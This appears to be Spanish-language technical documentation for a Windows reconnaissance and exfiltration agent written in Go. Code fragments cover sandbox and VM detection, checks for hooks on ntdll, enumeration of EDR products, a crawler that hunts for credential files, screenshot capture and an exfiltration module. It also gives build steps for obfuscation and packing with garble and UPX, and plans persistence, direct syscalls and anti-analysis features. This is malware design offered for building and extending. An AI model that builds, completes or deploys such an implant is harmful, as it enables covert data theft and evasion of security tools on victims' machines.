# Documentación Técnica

## Arquitectura del Agente

### Diseño Modular

El agente está diseñado con una arquitectura modular que separa responsabilidades:

```
main.go (Orquestador)
    ├── config/config.go (Configuración)
    ├── collectors/ (Módulos de recopilación)
    │   ├── sandbox.go
    │   ├── sysinfo.go
    │   ├── hooks.go
    │   ├── crawler.go
    │   └── edr.go
    ├── models/payload.go (Estructuras de datos)
    ├── utils/screenshot.go (Utilidades)
    └── exfil/sender.go (Exfiltración)
```

### Ejecución Paralela

El agente utiliza **goroutines** para ejecutar los 5 colectores en paralelo:

```go
var wg sync.WaitGroup
wg.Add(5)

go func() { /* CheckSandbox */ }()
go func() { /* SystemInfo */ }()
go func() { /* HookDetector */ }()
go func() { /* FileCrawler */ }()
go func() { /* EDRChecker */ }()

wg.Wait() // Esperar a que todos terminen
```

**Ventajas:**
- Reduce el tiempo total de ejecución
- Aprovecha múltiples CPUs
- Cada colector es independiente

## Implementación Detallada

### 1. CheckSandbox (collectors/sandbox.go)

#### Detección de Archivos de VM
```go
vmFiles := []string{
    "C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
    "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
    // ... más archivos
}

for _, file := range vmFiles {
    if _, err := os.Stat(file); err == nil {
        // Archivo encontrado = indicador de VM
    }
}
```

#### Detección por Registro
```go
windows.RegOpenKeyEx(
    windows.HKEY_LOCAL_MACHINE,
    "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
    0,
    windows.KEY_READ,
    &key,
)
```

#### Conteo de Ventanas
```go
enumWindows.Call(enumWindowsProc, 0)
// VMs típicamente tienen < 10 ventanas
```

### 2. SystemInfo (collectors/sysinfo.go)

#### Enumeración de Procesos
Usa `CreateToolhelp32Snapshot` para obtener snapshot de procesos:

```go
snapshot, _ := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
windows.Process32First(snapshot, &procEntry)

// Para cada proceso:
// - Obtener path con QueryFullProcessImageName
// - Obtener owner con OpenProcessToken + GetTokenUser
```

#### Conexiones de Red
Usa `GetExtendedTcpTable` y `GetExtendedUdpTable`:

```go
// TCP
getExtendedTcpTable.Call(
    buffer,
    &size,
    0,
    windows.AF_INET,
    5, // TCP_TABLE_OWNER_PID_ALL
    0,
)

// Parsea MIB_TCPROW_OWNER_PID structures
```

#### Usuarios y Grupos
Usa NetAPI32:

```go
// Usuarios
netUserEnum.Call(0, 0, 0, &dataPointer, ...)

// Grupos
netLocalGroupEnum.Call(0, 0, &dataPointer, ...)
```

#### Servicios
Usa Service Control Manager:

```go
scm := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_ENUMERATE_SERVICE)
windows.EnumServicesStatusEx(scm, ...)
```

#### Named Pipes
```go
handle := windows.FindFirstFile("\\\\.\\pipe\\*", &findData)
windows.FindNextFile(handle, &findData)
```

### 3. HookDetector (collectors/hooks.go)

#### Detección de Hooks en Funciones

Lee los primeros 5 bytes de funciones críticas:

```go
ntdll := windows.NewLazyDLL("ntdll.dll")
proc := ntdll.NewProc("NtWriteVirtualMemory")
addr := proc.Addr()

// Leer bytes
bytes := make([]byte, 5)
for i := 0; i < 5; i++ {
    bytes[i] = *(*byte)(unsafe.Pointer(addr + uintptr(i)))
}

// Detectar patrones de hook
if bytes[0] == 0xE9 {  // JMP rel32
    isHooked = true
}
if bytes[0] == 0xFF && bytes[1] == 0x25 {  // JMP [rip+offset]
    isHooked = true
}
```

**Funciones monitoreadas:**
- NtWriteVirtualMemory
- NtCreateThread
- NtCreateThreadEx
- NtQueueApcThread
- NtSetContextThread
- NtResumeThread
- NtOpenProcess
- NtOpenThread
- NtAllocateVirtualMemory
- NtProtectVirtualMemory
- NtCreateFile
- NtReadVirtualMemory
- NtQuerySystemInformation

### 4. FileCrawler (collectors/crawler.go)

#### Búsqueda Eficiente

```go
// Obtener unidades
for i := 'A'; i <= 'Z'; i++ {
    drive := string(i) + ":\\"
    if _, err := os.Stat(drive); err == nil {
        drives = append(drives, drive)
    }
}

// Caminar directorios
filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
    // Saltar directorios del sistema
    if skipDirs[info.Name()] {
        return filepath.SkipDir
    }
    
    // Verificar patrones
    if matchPattern(info.Name(), pattern) {
        foundFiles = append(foundFiles, path)
    }
})
```

**Directorios excluidos:**
- Windows
- Program Files
- Program Files (x86)
- $Recycle.Bin
- System Volume Information

### 5. EDRChecker (collectors/edr.go)

#### Detección Multi-método

```go
// 1. Por procesos
runningProcesses := getRunningProcessNames()
for _, proc := range edr.processes {
    if containsIgnoreCase(runningProcesses, proc) {
        detected = true
        method = "process"
    }
}

// 2. Por drivers
installedDrivers := getInstalledDrivers()
for _, driver := range edr.drivers {
    if containsIgnoreCase(installedDrivers, driver) {
        detected = true
        method = "driver"
    }
}
```

**Productos detectados:**
- Windows Defender (MsMpEng.exe, WdFilter.sys)
- CrowdStrike (CSFalconService.exe, csagent.sys)
- SentinelOne (SentinelAgent.exe, SentinelMonitor.sys)
- Carbon Black (cb.exe, cbk7.sys)
- Cylance (CylanceSvc.exe, CylanceDrv.sys)
- Symantec (ccSvcHst.exe, SRTSP.sys)
- McAfee (mfemms.exe, mfehidk.sys)
- Kaspersky (avp.exe, klif.sys)
- Trend Micro (TMBMSRV.exe, tmcomm.sys)
- ESET (ekrn.exe, eamonm.sys)
- Palo Alto (cyserver.exe, tlaworker.sys)
- FireEye (xagt.exe, xagt.sys)

### 6. Screenshot (utils/screenshot.go)

#### Captura de Pantalla Nativa

```go
// 1. Obtener DC de la pantalla
hdcScreen := getDC.Call(0)

// 2. Crear DC compatible
hdcMem := createCompatibleDC.Call(hdcScreen)

// 3. Crear bitmap
hBitmap := createCompatibleBitmap.Call(hdcScreen, width, height)

// 4. Copiar pantalla al bitmap
bitBlt.Call(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY)

// 5. Obtener bits del bitmap
getDIBits.Call(hdcMem, hBitmap, 0, height, buffer, &bitmapInfo, 0)

// 6. Convertir BGRA -> RGBA
// 7. Codificar a PNG
// 8. Convertir a base64
```

## Syscalls y APIs de Windows Utilizadas

### Kernel32.dll
- `GetDiskFreeSpaceExW` - Información de disco
- `GlobalMemoryStatusEx` - Información de memoria
- `GetTickCount64` - Uptime del sistema
- `CreateToolhelp32Snapshot` - Snapshot de procesos
- `Process32First/Next` - Enumeración de procesos
- `QueryFullProcessImageName` - Path del proceso
- `OpenProcess` - Abrir handle de proceso
- `FindFirstFile/FindNextFile` - Búsqueda de archivos

### User32.dll
- `GetDC` - Device Context
- `GetCursorPos` - Posición del mouse
- `EnumWindows` - Enumerar ventanas
- `IsWindowVisible` - Verificar visibilidad de ventana
- `GetSystemMetrics` - Métricas del sistema

### Advapi32.dll
- `RegOpenKeyEx` - Abrir clave de registro
- `RegQueryValueEx` - Leer valor de registro
- `RegEnumKeyEx` - Enumerar subclaves
- `RegCloseKey` - Cerrar handle de registro
- `OpenProcessToken` - Abrir token de proceso
- `GetTokenUser` - Obtener usuario del token
- `LookupPrivilegeValue` - Buscar privilegio
- `AdjustTokenPrivileges` - Ajustar privilegios
- `OpenSCManager` - Abrir Service Control Manager
- `EnumServicesStatusEx` - Enumerar servicios

### Netapi32.dll
- `NetUserEnum` - Enumerar usuarios
- `NetLocalGroupEnum` - Enumerar grupos
- `NetApiBufferFree` - Liberar buffer

### Iphlpapi.dll
- `GetExtendedTcpTable` - Tabla de conexiones TCP
- `GetExtendedUdpTable` - Tabla de conexiones UDP

### Ntdll.dll
- Funciones monitoreadas para detección de hooks

### Gdi32.dll
- `CreateCompatibleDC` - Crear DC compatible
- `CreateCompatibleBitmap` - Crear bitmap
- `SelectObject` - Seleccionar objeto
- `BitBlt` - Copiar bits
- `GetDIBits` - Obtener bits del bitmap
- `DeleteDC` - Eliminar DC
- `DeleteObject` - Eliminar objeto

## Formato del Payload

### Estructura JSON Completa

```json
{
  "timestamp": "2025-11-28T10:30:00Z",
  "hostname": "DESKTOP-ABC123",
  
  "sandbox_info": {
    "is_vm": true,
    "vm_indicators": ["C:\\Windows\\System32\\drivers\\VBoxGuest.sys"],
    "registry_indicators": ["SYSTEM\\CurrentControlSet\\Services\\VBoxGuest"],
    "disk_indicators": ["VBOX HARDDISK"],
    "cpu_temperature": 0.0,
    "window_count": 8,
    "has_debug_privilege": false
  },
  
  "system_info": {
    "os": "windows",
    "architecture": "amd64",
    "cpu_count": 4,
    "total_ram_mb": 8192,
    "total_disk_bytes": 107374182400,
    "bios": "American Megatrends Inc. 1.2.3 (01/01/2020)",
    
    "processes": [
      {
        "pid": 1234,
        "name": "chrome.exe",
        "owner": "DOMAIN\\User",
        "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
      }
    ],
    
    "users": ["Administrator", "User", "Guest"],
    "groups": ["Administrators", "Users", "Power Users"],
    
    "network_connections": [
      {
        "protocol": "TCP",
        "local_addr": "192.168.1.100:49152",
        "remote_addr": "93.184.216.34:443",
        "state": "ESTABLISHED"
      }
    ],
    
    "services": ["wuauserv", "WinDefend", "EventLog"],
    
    "environment_variables": {
      "PATH": "C:\\Windows\\system32;...",
      "USERNAME": "User",
      "COMPUTERNAME": "DESKTOP-ABC123"
    },
    
    "pipes": ["InitShutdown", "lsass", "ntsvcs"],
    
    "mouse_position": {"x": 1024, "y": 768},
    
    "installed_apps": [
      "Google Chrome",
      "Microsoft Office",
      "Adobe Reader"
    ],
    
    "recent_files": [
      "document.docx.lnk",
      "presentation.pptx.lnk"
    ],
    
    "uptime_seconds": 86400
  },
  
  "hook_info": {
    "hooked_functions": [
      {
        "module": "ntdll.dll",
        "function": "NtWriteVirtualMemory",
        "is_hooked": true,
        "first_bytes": "e9a1b2c3d4"
      }
    ],
    "suspicious_dlls": ["sbiedll.dll"]
  },
  
  "crawler_info": {
    "scanned_paths": ["C:\\", "D:\\"],
    "found_files": [
      "C:\\Users\\User\\Documents\\passwords.txt",
      "C:\\Users\\User\\Desktop\\credentials.xlsx"
    ],
    "total_files": 42
  },
  
  "edr_info": {
    "detected_products": [
      {
        "name": "Windows Defender",
        "type": "EDR/AV",
        "detected": true,
        "method": "process"
      }
    ],
    "running_processes": ["MsMpEng.exe", "chrome.exe", "..."],
    "installed_drivers": ["WdFilter.sys", "WdNisDrv.sys", "..."]
  }
}
```

## Optimizaciones

### Tamaño del Ejecutable

**Sin optimización:** ~8-10 MB
```bash
GOOS=windows GOARCH=amd64 go build
```

**Con stripping:** ~6-7 MB
```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
```

**Con UPX:** ~2-3 MB
```bash
upx --best --lzma agent.exe
```

**Con garble:** ~5-6 MB (ofuscado)
```bash
garble -literals -tiny build
```

### Rendimiento

- **Tiempo de ejecución:** 5-15 segundos (depende del sistema)
- **Uso de CPU:** Picos durante enumeración de procesos/archivos
- **Uso de memoria:** ~50-100 MB
- **Tráfico de red:** 100 KB - 5 MB (depende de screenshot)

### Límites Configurados

| Recurso | Límite | Ubicación |
|---------|--------|-----------|
| Conexiones TCP/UDP | 100 | sysinfo.go:115,163 |
| Servicios | 200 | sysinfo.go:283 |
| Aplicaciones | 500 | sysinfo.go:318 |
| Archivos recientes | 50 | sysinfo.go:343 |
| Named pipes | 100 | sysinfo.go:395 |
| Archivos crawler | Configurable | main.go:52 |

## Consideraciones de Seguridad

### Detección

**El agente puede ser detectado por:**
- Firmas de antivirus (strings, comportamiento)
- EDR (hooks, comportamiento anómalo)
- Análisis de tráfico de red (payload JSON)
- Análisis estático (imports, strings)

**Técnicas de evasión implementadas:**
- Uso de syscalls nativos de Windows
- Sin strings obvios de "malware"
- Comportamiento legítimo (APIs documentadas)

**Técnicas de evasión NO implementadas:**
- Cifrado de comunicaciones
- Ofuscación de strings
- Anti-debugging
- Syscalls directos (sin pasar por ntdll)
- Packing/crypting

### Privilegios Requeridos

**Usuario normal:**
- ✅ Información básica del sistema
- ✅ Procesos del usuario
- ✅ Archivos accesibles
- ❌ Procesos de otros usuarios (owner)
- ❌ Algunos servicios

**Administrador:**
- ✅ Todo lo anterior
- ✅ Procesos de todos los usuarios
- ✅ Todos los servicios
- ✅ SeDebugPrivilege
- ✅ Acceso completo al registro

## Extensiones Futuras

### Funcionalidades Adicionales

1. **Detección de debugging activo**
   - IsDebuggerPresent
   - CheckRemoteDebuggerPresent
   - NtQueryInformationProcess

2. **Análisis de timing**
   - RDTSC para detectar emulación
   - Sleep timing checks

3. **Verificación de interacción humana**
   - Movimiento del mouse
   - Clicks recientes
   - Historial del navegador

4. **Syscalls directos**
   - Bypass de hooks en ntdll
   - Llamadas directas al kernel

5. **Persistencia**
   - Registry Run keys
   - Scheduled tasks
   - Services

6. **Comunicación segura**
   - TLS/HTTPS
   - Cifrado AES del payload
   - Autenticación mutua

7. **Anti-análisis**
   - Detección de análisis de memoria
   - Detección de breakpoints
   - Verificación de integridad

### Mejoras de Código

1. **Logging estructurado**
2. **Manejo de errores mejorado**
3. **Tests unitarios**
4. **Configuración más flexible**
5. **Retry logic para exfiltración**
6. **Compresión del payload**
